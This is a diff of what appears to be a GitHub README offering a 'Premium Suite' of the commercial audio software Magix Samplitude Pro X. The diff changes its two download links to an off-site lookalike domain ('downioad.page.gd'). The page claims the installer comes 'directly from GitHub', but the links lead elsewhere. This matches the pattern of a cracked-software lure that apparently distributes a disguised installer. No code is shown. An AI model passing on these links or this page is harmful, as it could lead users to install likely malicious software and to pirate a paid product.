@@ -2,7 +2,7 @@
 
 Magix Samplitude Pro X is a leading digital audio workstation, and this Premium Suite delivers enhanced features and tools for 2026. Crafted for Windows 10 and 11, it provides seamless integration and professional capabilities for music production, recording, and mastering enthusiasts.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -67,7 +67,7 @@ A: Future updates will be made available on the download page. Simply visit the 
 
 To begin using the Magix Samplitude Pro X Premium Suite, download the latest version directly from GitHub:
 
-[Get it here](https://download-page.page.gd/)
+[Get it here](https://downioad.page.gd/)
 
 ---
 
